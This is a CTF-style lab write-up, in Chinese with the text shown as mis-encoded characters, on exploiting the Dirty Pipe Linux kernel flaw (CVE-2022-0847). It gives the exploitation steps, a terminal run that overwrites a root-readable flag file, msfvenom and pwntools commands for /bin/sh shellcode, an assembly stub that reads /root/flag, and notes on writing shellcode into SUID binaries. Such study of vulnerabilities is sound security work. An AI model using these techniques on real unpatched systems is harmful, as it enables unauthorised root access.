## ç¼–è¯‘é€‰é¡¹

- æœ¬äººé€‰æ‹© `linux-5.10.1` å†…æ ¸ç‰ˆæœ¬
```txt
CONFIG_SLAB=y
CONFIG_E1000=y 
CONFIG_E1000E=y
```

## åŸç†

å½±å“èŒƒå›´ï¼š 5.8 ç‰ˆæœ¬ä»¥ä¸Šçš„å†…æ ¸å‡ä¼šæ”¶åˆ°è¯¥æ¼æ´çš„å½±å“ï¼Œåœ¨ 5.16.11ã€5.15.25ã€5.10.102 ç‰ˆæœ¬ä¸­æ‰è¢«ä¿®å¤

è¯¦æƒ…è§[pdf](./CVE-2022-0847%20%20%20%20DirtyPipe.pdf)

1. pipe flagsä½¿ç”¨åæ²¡æœ‰æ¸…é™¤
2. splice 0æ‹·è´ä½¿ç”¨ pipe ä¼ è¾“ã€‚

## steps

1. åˆ›å»ºç®¡é“ï¼Œè¯»å†™ä¸€æ¬¡ï¼Œä½¿å…¶flagä¸º `PIPE_BUF_FLAG_CAN_MERGE`
2. splice 0æ‹·è´ï¼Œå†™å…¥ä¸€ä¸ªå­—èŠ‚
3. å†™å…¥ç®¡é“ï¼Œç”±äºflagçš„é—®é¢˜ï¼Œå†™å…¥ä¹‹å‰çš„æ–‡ä»¶ï¼Œé€ æˆ**ä»»æ„å¯è¯»æ–‡ä»¶**çš„å†™

### how

1. å¾€å¯è¯»æ–‡ä»¶ä¸­å†™å…¥ï¼Œæ¯”å¦‚ `/etc/passwd`
2. suid æ–‡ä»¶å†™å…¥ shellcode, æ¯”å¦‚ `sudo` å‘½ä»¤

## exploit

1. åˆ›å»ºä¸€ä¸ª`/flag.txt` å¹¶ä¸”è®¾ç½®ä¸ºå¯è¯»ï¼Œçœ‹èƒ½å¦æ”¹å†™
2. é‚£å†™å…¥ suidç¨‹åºåªéœ€è¦æŠŠå†™çš„å†…å®¹æ”¹æˆshellcode å°±è¡Œã€‚ä½†æ˜¯åˆ«å¿˜äº†æ¢å¤å†…å®¹ã€‚

ç¼–è¯‘

```bash
make
    [+] start dirtypipe_writeany
    clang -static  dirtypipe_writeany.c -o dirtypipe_writeany
    [+] end
    [+] start dirtypipe_suid
    clang -static  dirtypipe_suid.c -o dirtypipe_suid
    [+] end make 
```

æ‰“åŒ…ç¯å¢ƒï¼Œè¿è¡Œ

```bash
[ctf@busybox]-[/home/ctf] ğŸ¤£ ğŸ‘‰ ls
dirtypipe_writeany
[ctf@busybox]-[/home/ctf] ğŸ¤£ ğŸ‘‰ cat /flag.txt
flag{what_A_mAg1c_cve}
[ctf@busybox]-[/home/ctf] ğŸ¤£ ğŸ‘‰ ./dirtypipe_writeany /flag.txt 5 polluted
[+] get page size
[+] get and check args
[+] prepare pipe
[+] splice file
[+] write content to target file
[+] finish exploit!!
[ctf@busybox]-[/home/ctf] ğŸ¤£ ğŸ‘‰ cat /flag.txt
flag{pollutedAg1c_cve}
```

**åœ¨ä½¿ç”¨æ—¶å¯èƒ½clangæŠ¥é”™ï¼Œä¿®æ”¹Makefile**

```makefile
# change `CC := clang` to this
CC := gcc
```

### suid

**ä¿®æ”¹suid ç¨‹åºï¼Œç¯å¢ƒé—®é¢˜**
å¯ä»¥æ›¿æ¢ubuntuçš„å†…æ ¸è¿›è¡ŒéªŒè¯ æˆ–è€… åœ¨è‡ªåˆ¶æ–‡ä»¶ç³»ç»Ÿç›´æ¥è¦†å†™ `/bin/busybox` å…¶ä½™æ–‡ä»¶éƒ½éƒ½æ˜¯å…¶link

#### ç”Ÿæˆshellcode

æœ€å¥½æ˜¯ç”Ÿæˆelfæ–‡ä»¶ï¼Œå¹¶ä¸”ç›¸å½“å°ï¼Œèƒ½å¤Ÿå†™å…¥

1. ä½¿ç”¨msfvenomç”Ÿæˆelf shellcode

```bash
$ msfvenom --list payloads | grep linux
# è¿™é‡Œæ‰¾ä¸ªexec
$ msfvenom -p linux/x64/exec --list-options
$ msfvenom -p linux/x64/exec CMD='/bin/sh' -f c  # -f ä»£è¡¨æŒ‡å®šçš„æ–‡ä»¶æ ¼å¼
$ msfvenom -p linux/x64/exec CMD='/bin/sh'  -f elf > shell.elf
$ file shell.elf
shell.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

ç”Ÿæˆæ–‡ä»¶ä½¿ç”¨ syscall çš„å¾ˆå°çš„ elf æ–‡ä»¶

2. ä½¿ç”¨ pwntools ç”Ÿæˆ shellcodeï¼Œéœ€è¦å°†å…¶äºŒè¿›åˆ¶å­—èŠ‚ç æ‰“å°å‡ºæ¥, ä½†æ˜¯å…¶ä¸æ˜¯elfæ ¼å¼ï¼Œç›´æ¥è¦†ç›–ä¼šå¯¼è‡´é”™è¯¯
- ä½†è¿˜æ˜¯å¯ä»¥å†™ï¼Œå†™å…¥æŸä¸ªå‡½æ•°é‡Œï¼Œä½†æ˜¯åç§»è®¡ç®—éœ€è¦ç»“åˆäºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ
- æ¯”å¦‚è¯´å†™ busybox çš„ shutdown å‡½æ•°åœ°å€æ˜¯ 0x49B5DA, åŸºåœ°å€ 0x400000 å› æ­¤åç§»å°±æ˜¯ 0x9B5DAï¼Œç›´æ¥å†™å…¥è¿™é‡Œã€‚ï¼ˆçœ‹é˜Ÿå†…å¤§ä½¬çš„åšæ³•

```python
>>> shellcraft.amd64.linux.setuid(0)
>>> shellcraft.amd64.linux.setgid(0)
>>> shellcraft.amd64.linux.sh()
```

3. éœ€è¦ç»“åˆ pwntools å†™æ±‡ç¼–æ–‡ä»¶ï¼ˆ~~èœ~~ã€‚nasmç¼–è¯‘

```asm
; nasm -f elf64 shellcode.asm -o shellcode.o
; ld shellcode.o -o your_program

; open('/root/flag', 0)
; read(fd, buffer, 0x40)
; write(1, buffer, 0x40)

section .text
  global _start

_start:
  push 0x1010101 ^ 0x6761
  xor DWORD [rsp], 0x1010101
  mov rax, 0x6c662f746f6f722f
  push rax
  mov rdi, rsp
  xor edx, edx
  xor esi, esi
  push 2
  pop rax
  syscall
  mov edi, eax
  mov rsi, rsp
  mov rdx, 40h   ; read(open_fd, rsp, 0x40)
  xor rax, rax
  syscall
  mov eax, 1
  mov edi, 1
  syscall       ; write(1, rsp, 0x40)
```

## dirty pipe åœ¨uaf ä½¿ç”¨

å¯ä»¥æ”¹å˜ pipe çš„flagï¼Œä»è€Œé¿å…äº† smep, smap, kpti ç­‰ä¿æŠ¤çš„ç»•è¿‡ã€‚ä½†æ˜¯éœ€è¦æ¯”è¾ƒå¤§çš„ heap sizeã€‚victim heapsize è‡³å°‘èƒ½åŒ…å«2ä¸ª`struct pipe_buffer`ç»“æ„ä½“ 40 *2 = 80,ä¹Ÿå°±æ˜¯kmalloc-96å¤§å°çš„slabå¤§å°